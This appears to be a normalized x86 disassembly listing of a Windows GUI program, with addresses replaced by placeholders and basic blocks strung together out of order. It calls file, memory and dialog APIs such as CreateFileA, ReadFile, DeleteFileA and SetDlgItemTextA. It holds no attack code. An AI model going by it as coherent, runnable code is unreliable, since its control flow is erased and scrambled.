mov edi 0x10
nop
mov esi [ rw-data ]
test esi esi
je r-xdata
cmp [ rw-data ] eax
mov ecx [ rw-data ]
jae r-xdata
mov edx rw-data
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x4 ]
push 0x0
push edx
push 0x1802
push ecx
call [ PostMessageA@IAT ]
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
cmp [ ebp - 0xd4 ] 0x10
mov eax [ ebp - 0xe8 ]
jae r-xdata
mov [ eax ] edi
call sub_4065a0
add esp 0xc
test eax eax
je r-xdata
inc [ edi + 0x4 ]
test edi edi
push eax
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov [ ebp - 0x1c ] 0xfffffffd
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
call sub_406690
jmp r-xdata
inc [ ecx + 0x4 ]
mov [ eax ] ecx
call sub_405fe0
jmp r-xdata
inc [ ecx + 0x4 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2c ]
mov esi [ rw-data ]
xor ebx ebx
cmp eax edi
mov eax [ ebp - 0x40 ]
mov [ rw-data ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
mov ebx [ rw-data ]
push 0xffffffff
shl eax 0x5
add eax ebx
push 0x0
push eax
lea ecx [ ebp - 0x44 ]
call sub_401dd0
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
cmp [ ebx + 0x28 ] eax
jb r-xdata
mov ecx rw-data
cmp [ ebp - 0xd4 ] 0x10
jb r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0xe8 ]
mov [ ebp - 0x1c ] 0xfffffffc
call sub_481410
jmp r-xdata
mov esi [ ebp - 0x24 ]
mov edi 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp + 0x8 ] edx
je r-xdata
push eax
call sub_439280
add esp 0x4
cmp eax 0x7
mov [ ebp - 0x48 ] eax
mov [ rw-data ] esi
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_458010
mov ecx [ ebp - 0x40 ]
mov esi eax
mov eax [ ebp - 0x2c ]
add esp 0x4
cmp eax edi
jae r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
imul eax eax 0x70
mov ecx [ eax + esi + 0x38 ]
add eax esi
cmp ecx 0xffffffff
jne r-xdata
lea eax [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
mov ecx [ eax ]
push eax
push ecx
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_448f60
mov edx [ ebp - 0x8c ]
push edx
call j_sub_4b66ed#2
mov ecx [ ebp - 0xc ]
add esp 0x4
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xe8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ ecx ]
push 0x1
call [ edx ]
add esi 0x14
mov esi [ esi + 0x14 ]
jmp r-xdata
mov ecx [ eax + 0x248 ]
mov edi 0x10
cmp ecx edi
jb r-xdata
mov [ ebp - 0x1c ] 0xfffffffa
jmp r-xdata
mov eax [ edi + 0x12c ]
test eax eax
mov ebx 0x10
jne r-xdata
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
jae r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x48 ] ecx
mov cl [ rw-data ]
test cl cl
jne r-xdata
add ecx esi
mov eax ecx
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
lea ebx [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ ebp - 0x40 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov esi [ ebp - 0x60 ]
push [ ebp - 0x60 ]
push edi
push edx
push ecx
push eax
call sub_405dd0
add esp 0x14
test eax eax
jne r-xdata
push esi
call sub_405e40
add eax 0x234
mov eax [ eax + 0x234 ]
jmp r-xdata
cmp [ edi + 0x130 ] ebx
jb r-xdata
mov [ ebp + 0x8 ] 0xffffffff
jmp r-xdata
mov eax ecx
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0xb0 ] 0x0
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ ebp - 0x40 ]
mov edx [ eax * 4 + rw-data ]
mov eax edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebx
push eax
push ecx
lea ecx [ ebp - 0xd0 ]
call sub_401e80
mov eax [ ebp - 0x30 ]
cmp esi eax
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x44 ]
ja r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebp - 0x44 ]
call sub_401cc0
lea ecx [ esi + 0x14 ]
push eax
push ecx
call sub_405ef0
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x14 ]
push eax
push ecx
call sub_405ef0
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x24 ]
cmp [ esi + 0x28 ] edi
jb r-xdata
add edi 0x11c
mov edi [ edi + 0x11c ]
jmp r-xdata
mov eax [ edi + 0x2ec ]
test eax eax
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0xb4 ]
call sub_401e80
lea edx [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_448ca0
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
cmp [ ebp - 0x9c ] edi
mov [ ebp - 0xf8 ] ecx
mov [ ebp - 0x4 ] 0x6
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ ebp - 0x44 ]
call sub_401cc0
push 0x0
sub esi eax
push esi
call sub_4017f0
push 0xffffffff
push esi
call sub_401ba0
jmp r-xdata
cmp [ esi + 0x28 ] edi
jb r-xdata
cmp [ edi + 0x2f0 ] ebx
jb r-xdata
or esi 0xffffffff
jmp r-xdata
push edi
call j_sub_4b692d
mov edi [ rw-data ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x18 ]
inc ecx
test bl bl
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0x18 ] ecx
je r-xdata
mov edx [ ebp - 0xb0 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x44 ]
call sub_401cc0
push 0xffffffff
push 0x0
lea ecx [ ebp - 0xd0 ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_4018c0
cmp [ ebp - 0xb8 ] edi
mov [ ebp - 0x4 ] 0x6
jb r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x324 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
add edi 0x2dc
mov edi [ edi + 0x2dc ]
jmp r-xdata
cmp [ edi + 0x360 ] ebx
jb r-xdata
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
mov edx [ ebp - 0xcc ]
push edx
call j_sub_4b66ed#2
add esp 0x4
add edi 0x34c
mov edi [ edi + 0x34c ]
jmp r-xdata
push edi
call j_sub_4b692d
mov edi [ rw-data ]
add esp 0x4
mov esi eax
push 0xffffffff
push 0x0
lea ecx [ ebp - 0xec ]
push ecx
lea ecx [ ebp - 0x7c ]
call sub_401dd0
mov al [ rw-data ]
test al al
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0xd0 ]
call sub_401e80
mov eax [ rw-data ]
cmp [ eax + 0x37c ] 0x10
mov [ ebp - 0x4 ] 0x12
jb r-xdata
mov ebx 0xf
mov eax edi
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x1 ]
cmp [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea ecx [ eax + 0x368 ]
mov ecx [ eax + 0x368 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edi [ ebp - 0x24 ]
mov edx [ edi + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
xor eax eax
lea esp [ esp ]
lea eax [ ebp - 0x40 ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea ecx [ ebp - 0x7c ]
call sub_401e80
push 0x5c
push 0x1
lea ecx [ ebp - 0x7c ]
call sub_4017f0
push 0xffffffff
push 0x0
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_4018c0
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
lea ecx [ ebp - 0xb4 ]
call sub_401e80
mov ecx [ rw-data ]
mov eax r--data
mov [ ebp - 0x4 ] 0x13
add ecx 0x348
lea edi [ eax + 0x1 ]
mov eax ecx
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
lea edi [ eax + 0x1 ]
mov ecx ebx
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
mov edx [ ecx + esi + 0x38 ]
cmp edx 0xffffffff
lea eax [ ecx + esi ]
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push r--data
call sub_401e80
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
add ecx 0x364
push rw-data
call sub_401dd0
mov eax [ rw-data ]
xor edi edi
test eax eax
jle r-xdata
xor esi esi
cmp edx esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ esi + eax * 4 ] ecx
je r-xdata
cmp eax ecx
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ebx 0x1
push ebx
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov [ ebp + 0x8 ] 0x0
call sub_4af910
mov edi eax
mov eax [ rw-data ]
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
add eax esi
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
jne r-xdata
mov ecx [ rw-data ]
push ecx
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp - 0xf4 ] esp
mov eax esp
je r-xdata
lea ecx [ ecx ]
sub ebx edx
sar ebx 0x2
mov ecx ebx
xor ecx ecx
jmp r-xdata
inc eax
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp edi ebx
mov ecx [ rw-data ]
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x8 ]
test cl cl
mov ecx [ rw-data ]
jne r-xdata
mov [ eax ] ecx
call sub_406260
add esp 0x8
test eax eax
jne r-xdata
inc [ ecx + 0x4 ]
mov ecx [ rw-data ]
mov edx [ ebx + ecx + 0x48 ]
inc edx
cmp esi edx
jne r-xdata
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
push eax
add ecx 0x118
call sub_421150
mov ebx [ edx + eax * 4 ]
cmp ebx esi
mov [ ebp - 0x18 ] ebx
je r-xdata
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0x14 ]
push esi
push esi
push edx
push eax
call sub_4706c0
add esp 0x10
cmp eax esi
jge r-xdata
cmp eax ecx
jl r-xdata
test edx edx
jne r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
cmp [ ecx + esi + 0x38 ] 0xffffffff
je r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov [ ebp - 0x1c ] ebx
push ebx
lea eax [ ecx + esi ]
lea edx [ ebp - 0x5c ]
push edx
lea ecx [ ebp - 0x4c ]
push ecx
push eax
call sub_4af910
mov edx [ rw-data ]
mov edi eax
lea eax [ edx + esi ]
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ rw-data ]
push edx
add ecx 0x118
call sub_421150
mov ecx [ rw-data ]
push esi
add ecx 0x2d8
call sub_421150
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0xd0 ]
add ecx 0x348
push eax
call sub_401dd0
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0xb4 ]
add ecx 0x364
push edx
call sub_401dd0
mov eax [ ebp - 0x9c ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov [ ebp - 0x1c ] 0xfffffffb
mov eax [ rw-data ]
inc edi
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
push eax
add ecx 0x2d8
call sub_421150
mov [ ebp - 0x104 ] ebx
mov [ ebp - 0x4 ] 0x9
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebx
call sub_4440b0
mov al [ rw-data ]
test al al
je r-xdata
inc [ ebx + 0xd48 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ ebp - 0xb8 ] esi
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov eax [ ebp - 0xb0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov ebx edi
imul ebx ebx 0x70
mov edx [ ebx + ecx + 0x48 ]
inc edx
cmp eax edx
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp [ ebp - 0x64 ] edi
mov esi 0xf
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov ecx [ ebp - 0x40 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ecx + esi + 0x40 ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx ebx
push edx
call sub_4440b0
mov [ ebp - 0x54 ] eax
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx ebx
push eax
call sub_444100
cmp ebx esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0xf4 ] ebx
je r-xdata
cmp [ ebp - 0x48 ] 0x4
je r-xdata
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
jae r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ rw-data ]
imul esi esi 0x70
cmp [ eax + esi + 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x50 ]
mov ebx [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x64 ] esi
mov esi [ ebp - 0x60 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov edx [ ebp - 0x78 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
mov [ ebp - 0x4 ] 0xa
je r-xdata
cmp [ ebx + 0x8 ] esi
jne r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x28 ] esi
je r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xf0 ]
push edx
push edi
push sub_447d90
xor ecx ecx
mov cl [ rw-data ]
push 0x0
xor edx edx
mov dl [ rw-data ]
push 0x0
push ecx
mov ecx ebx
push edx
push 0x0
push 0x1
push eax
call sub_43d820
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x78 ]
lea eax [ eax + esi + 0x4 ]
mov eax [ eax + esi + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
cmp eax esi
mov edi [ SetDlgItemTextA@IAT ]
jge r-xdata
mov eax [ ebp - 0x2c ]
mov edi 0x10
cmp eax edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebx + 0xc ] 0x2000000c
mov esi [ ebx + 0x20 ]
mov [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebx + 0x884 ]
cmp eax esi
mov ecx [ ebx + 0x458 ]
mov [ ebp + 0x8 ] ecx
jne r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x9
jae r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ ebp - 0x2c ]
mov esi 0x10
cmp eax esi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ edx + esi ]
push ecx
push eax
mov [ ebp - 0x14 ] 0x0
call sub_4053a0
add esp 0x14
test eax eax
jge r-xdata
push eax
call sub_439280
add esp 0x4
cmp eax 0x1
jne r-xdata
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov ebx [ ebp - 0x24 ]
mov eax [ ebx + 0x4 ]
add esp 0xc
lea edx [ ebp - 0x324 ]
push edx
push 0xdd3
push eax
call [ SetDlgItemTextA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
xor esi esi
movzx eax [ ebx + 0x32 ]
imul eax [ ebx + 0x28 ]
mov ecx [ ebx + 0x2c ]
cdq
and edx 0x7
add eax edx
mov edi eax
shl ecx 0x1
mov eax 0x55555556
imul ecx
sar edi 0x3
mov eax edx
add edi 0x3
shr eax 0x1f
and edi 0xfffffffc
add edx eax
imul edi edx
sub esi edi
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
mov esi [ eax + 0x18 ]
add esi ecx
xor esi esi
jmp r-xdata
push eax
call [ LocalLock@IAT ]
mov [ ebx + 0x20 ] eax
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push ecx
push ebx
push 0x0
push edx
push sub_447d90
xor ecx ecx
mov cl [ rw-data ]
push 0x0
xor edx edx
mov dl [ rw-data ]
push 0x0
push ecx
mov ecx [ ebp - 0x48 ]
push edx
push 0x0
push ecx
mov ecx [ ebp - 0x18 ]
push eax
call sub_43d820
test ebx ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x78 ]
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp + 0x8 ] edx
je r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
mov [ ebp - 0x4 ] 0x6
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ebx [ ebp - 0x24 ]
mov edx [ ebx + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
cmp [ ebp - 0x64 ] esi
mov eax [ ebp - 0x78 ]
jae r-xdata
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + esi ]
mov ecx [ eax + 0x40 ]
test ecx ecx
mov cl [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0x8 ] 0x0
mov al [ rw-data ]
test al al
je r-xdata
mov ebx [ ebp - 0x18 ]
mov ecx ebx
call sub_40b2d0
mov ecx [ ebp - 0x18 ]
mov edi eax
mov eax [ ecx + 0xc ]
add ebx 0x24
mov [ ebp - 0x28 ] eax
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax + 0x1c ]
lea edi [ eax + ecx ]
xor edi edi
jmp r-xdata
test eax eax
jne r-xdata
push ebx
call sub_4b66ed
add esp 0x4
jmp r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
cmp [ edi + esi + 0x18 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi eax
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ ebp - 0x2c ]
mov edi 0x10
cmp eax edi
mov eax [ ebp - 0x40 ]
jae r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ edi + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x324 ]
push eax
push 0xdd3
push ecx
call [ SetDlgItemTextA@IAT ]
cmp [ ebx + 0xc ] 0x20000008
mov [ ebp - 0x98 ] 0x0
jne r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
test cl cl
je r-xdata
test cl cl
mov [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp - 0x80 ]
mov [ ebp - 0x1c ] 0x2
mov ecx [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x28 ] 0x0
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xd
jae r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x7b4 ]
call sub_439410
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x54 ]
xor edx edx
mov dl [ rw-data ]
mov [ ebp - 0x4 ] 0xb
push edx
mov edx [ ebp + 0x8 ]
push 0x1
push eax
mov eax [ ebp - 0x28 ]
push ecx
push 0x0
push 0x0
push edi
push esi
push edx
push ebx
push eax
lea ecx [ ebp - 0x7b4 ]
call sub_43ba10
test eax eax
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x44c ]
lea ebx [ eax + 0x45c ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
lea edi [ edi + esi + 0x4 ]
mov edi [ edi + esi + 0x4 ]
jmp r-xdata
mov edi 0x10
mov eax [ ebp - 0x84 ]
inc eax
mov edi 0x10
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov esi [ ebp - 0x24 ]
mov edx [ esi + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
lea eax [ ebp - 0x11c ]
push eax
call [ GetLocalTime@IAT ]
lea ecx [ ebp - 0x100 ]
push ecx
lea edx [ ebp - 0x11c ]
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push sub_447d90
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
push ecx
jae r-xdata
lea eax [ ebp - 0x40 ]
push 0x0
push esi
call [ GetFileSize@IAT ]
push eax
push 0x0
call [ LocalAlloc@IAT ]
mov edi eax
push 0x0
lea eax [ ebp - 0x108 ]
push eax
push edi
call [ LocalSize@IAT ]
push eax
push edi
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
cmp [ ebp - 0xf0 ] 0x20000008
mov [ ebp - 0x94 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
cmp [ edi + 0x28 ] 0x10
mov eax [ rw-data ]
jb r-xdata
mov [ ebp - 0x98 ] 0x1
push eax
call [ LocalFree@IAT ]
jmp r-xdata
cmp [ ebp - 0x64 ] edi
mov ecx [ ebp - 0x78 ]
jae r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push sub_447d90
push ecx
cmp [ rw-data ] edi
mov ecx [ rw-data ]
push edx
jae r-xdata
cmp [ ebp - 0x64 ] edi
mov ecx [ ebp - 0x78 ]
jae r-xdata
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x14 ] 0x0
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
mov edx [ ebp - 0x4c ]
test edx edx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov [ edi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ edi + 0x20 ] 0x0
push 0x6
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_41c070
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
test eax eax
mov [ ebp - 0x4 ] 0x10
je r-xdata
push edi
call sub_439280
add esp 0x4
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x2c ] edi
jb r-xdata
mov edx [ ebp - 0xfc ]
push eax
mov eax [ ebp - 0x100 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
mov eax [ ebp - 0x14 ]
mov ecx [ rw-data ]
imul eax eax 0x70
add eax ecx
cmp [ ebx + 0x28 ] 0x10
jb r-xdata
mov [ ebp - 0x94 ] 0x1
lea ebx [ edi + 0x14 ]
mov ebx [ edi + 0x14 ]
jmp r-xdata
cmp [ eax + 0x18 ] edi
jb r-xdata
lea ecx [ ebp - 0x78 ]
mov edx [ eax + 0x28 ]
push ecx
mov ecx [ eax + 0x2c ]
push ecx
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
push edx
jae r-xdata
mov ecx rw-data
push 0x0
push 0x0
push ecx
push 0x0
push eax
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
lea ecx [ ebp - 0x78 ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push ebx
push sub_447d90
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
push ecx
jae r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp [ ebp - 0x64 ] edi
mov eax [ ebp - 0x78 ]
jae r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push ebx
push sub_447d90
push edx
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
mov esi eax
